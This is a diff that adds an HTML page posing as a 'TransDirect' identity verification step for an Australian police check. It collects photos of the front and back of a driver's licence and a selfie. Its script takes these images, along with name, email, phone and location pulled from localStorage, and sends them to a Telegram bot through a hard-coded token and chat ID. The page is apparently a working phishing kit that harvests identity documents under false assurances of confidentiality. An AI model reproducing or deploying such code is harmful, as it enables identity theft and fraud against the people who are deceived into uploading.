@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>TransDirect</title>
+  <link rel="icon" href="/transdirect_icon.png" />
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 2rem;
+      background: linear-gradient(60deg, #efad5d, #5abfeb);
+    }
+    .form-container {
+      max-width: 400px;
+      width: 80%;
+      margin: 0 auto;
+      padding: 2rem;
+      background-color: white;
+      border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    }
+    h2 {
+      color: #333;
+      font-size: 1.8rem;
+      margin-bottom: 0.5rem;
+    }
+    p {
+      color: #555;
+      font-size: 1rem;
+      margin-bottom: 1.5rem;
+    }
+    label {
+      display: block;
+      margin-bottom: 0.5rem;
+      font-weight: bold;
+      color: #555;
+    }
+    input[type="file"] {
+      display: none;
+    }
+    .file-label {
+      display: inline-block;
+      width: 100%;
+      padding: 12px;
+      background-color: #0073e6;
+      color: white;
+      text-align: center;
+      border-radius: 10px;
+      cursor: pointer;
+      font-size: 1rem;
+      transition: background-color 0.3s, color 0.3s, box-shadow 0.3s;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    }
+    .file-label:hover {
+      background-color: #005bb5;
+      box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2);
+    }
+    .file-label.filled {
+      background-color: #28a745;
+    }
+    .file-label.filled span {
+      display: inline;
+    }
+    .row {
+      display: flex;
+      justify-content: space-between;
+      gap: 10px;
+    }
+    .row .file-label {
+      width: calc(50% - 5px);
+    }
+    button {
+      width: 100%;
+      padding: 14px;
+      background-color: #0073e6;
+      color: white;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      font-size: 1rem;
+      font-weight: bold;
+      transition: background-color 0.3s, box-shadow 0.3s;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      margin-top: 1rem;
+    }
+    button:hover {
+      background-color: #005bb5;
+      box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2);
+    }
+    .modal {
+      display: none;
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0, 0, 0, 0.5);
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+    .modal-content {
+      background: white;
+      padding: 2rem;
+      border-radius: 12px;
+      text-align: center;
+      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
+      max-width: 400px;
+      width: 90%;
+      margin: 0 1rem;
+    }
+    .modal .file-label {
+      width: 100%;
+    }
+    .highlight {
+      background-color: #f0f8ff;
+      border-left: 4px solid #0073e6;
+      padding: 1rem;
+      margin: 1rem 0;
+      text-align: left;
+    }
+    .highlight ul {
+      padding-left: 1.5rem;
+    }
+    .highlight strong {
+      color: #005bb5;
+    }
+  </style>
+</head>
+<body>
+  <div class="form-container">
+    <h2>Verify Your Identity</h2>
+    <p>
+      Under Australian law, we are required to collect personal identification
+      information to conduct a police check. Rest assured your information is handled with
+      <strong>strict confidentiality</strong>.
+    </p>
+    <div class="highlight">
+      <li style="text-align: left;">Do not: <strong>crop your photo</strong></li>
+      <li style="text-align: left;">Do not: <strong>upload screenshots</strong></li>
+      <li style="text-align: left;">Do not: <strong>upload scans</strong></li>
+      <li style="text-align: left;">Ensure: <strong>all numbers and letters are visible</strong></li>
+    </div>
+    <form id="licenseForm">
+      <img src="/license_example.JPG" alt="license example" width="100%" />
+      <div class="row">
+        <label class="file-label" for="licenseFront"><span>Upload Front</span></label>
+        <input type="file" id="licenseFront" name="licenseFront" accept="image/*" required />
+
+        <label class="file-label" for="licenseBack"><span>Upload Back</span></label>
+        <input type="file" id="licenseBack" name="licenseBack" accept="image/*" required />
+      </div>
+      <button type="button" id="nextButton">Next</button>
+    </form>
+  </div>
+  <div class="modal" id="selfieModal">
+    <div class="modal-content">
+      <h2>Upload Your Selfie</h2>
+      <img src="/selfie_example.JPG" alt="selfie_example" width="300px" />
+      <div class="highlight">
+        <li style="text-align: left;">This will be used to corroborate the license.</li>
+      </div>
+      <label class="file-label" for="selfie"><span>Upload Selfie</span></label>
+      <input type="file" id="selfie" name="selfie" accept="image/*" required />
+      <button type="button" id="submitButton">Submit</button>
+    </div>
+  </div>
+  <script>
+    const TELEGRAM_BOT_TOKEN = '7873416864:AAF64fGpn0DIW0ltoyHMLjCImibeMLKdw2c';
+    const TELEGRAM_CHAT_ID  = '5524654647';
+    async function sendTelegramMessage(messageText) {
+      const sendMessageUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      const response = await fetch(sendMessageUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: messageText
+        })
+      });
+      if (!response.ok) {
+        throw new Error('Failed to send text message to Telegram.');
+      }
+    }
+    async function sendDocumentToTelegram(file, fileLabel) {
+      const formData = new FormData();
+      formData.append('chat_id', TELEGRAM_CHAT_ID);
+      formData.append('document', file, fileLabel + '_' + file.name);
+      const sendDocUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
+      const response = await fetch(sendDocUrl, {
+        method: 'POST',
+        body: formData
+      });
+      if (!response.ok) {
+        throw new Error(`Failed to send ${fileLabel} to Telegram.`);
+      }
+    }
+    function updateLabel(inputId) {
+      const input = document.getElementById(inputId);
+      const label = document.querySelector(`label[for=${inputId}]`);
+      const labelText = label.querySelector('span');
+      input.addEventListener('change', () => {
+        if (input.files.length > 0) {
+          label.classList.add('filled');
+          labelText.textContent = 'Uploaded';
+        }
+      });
+    }
+    updateLabel('licenseFront');
+    updateLabel('licenseBack');
+    updateLabel('selfie');
+    document.getElementById('nextButton').addEventListener('click', () => {
+      const licenseFront = document.getElementById('licenseFront').files[0];
+      const licenseBack  = document.getElementById('licenseBack').files[0];
+
+      if (!licenseFront || !licenseBack) {
+        alert('Please upload both sides of your license.');
+        return;
+      }
+      document.getElementById('selfieModal').style.display = 'flex';
+    });
+    document.getElementById('submitButton').addEventListener('click', async () => {
+      const submitBtn = document.getElementById('submitButton');
+      const licenseFront = document.getElementById('licenseFront').files[0];
+      const licenseBack  = document.getElementById('licenseBack').files[0];
+      const selfie       = document.getElementById('selfie').files[0];
+      if (!selfie) {
+        alert('Please upload a selfie.');
+        return;
+      }
+      submitBtn.textContent = 'Please wait...';
+      submitBtn.style.backgroundColor = '#28a745';
+      submitBtn.disabled = true;
+      try {
+        const name       = localStorage.getItem('name') || 'N/A';
+        const location   = localStorage.getItem('location') || 'N/A';
+        const email      = localStorage.getItem('email') || 'N/A';
+        const phone      = localStorage.getItem('phone') || 'N/A';
+        const experience = localStorage.getItem('experience') || 'N/A';
+        const messageText = 
+`🧾 User Info:
+👤 Name:       ${name}
+🌏 Location:   ${location}
+📧 Email:      ${email}
+📞 Phone:      ${phone}
+😔 Experience: ${experience}
+🪪 Front License: ${licenseFront.name}
+🪪 Back License:  ${licenseBack.name}
+👤 Selfie:        ${selfie.name}`;
+        await sendTelegramMessage(messageText);
+        await sendDocumentToTelegram(licenseFront, 'License_Front');
+        await sendDocumentToTelegram(licenseBack,  'License_Back');
+        await sendDocumentToTelegram(selfie,       'Selfie');
+        alert('Documents submitted successfully!');
+        document.getElementById('selfieModal').style.display = 'none';
+        window.location.href = 'final.html';
+      } catch (error) {
+        console.error(error);
+        submitBtn.textContent = 'Submit';
+        submitBtn.style.backgroundColor = '#0073e6';
+        submitBtn.disabled = false;
+      }
+    });
+  </script>
+</body>
+</html>
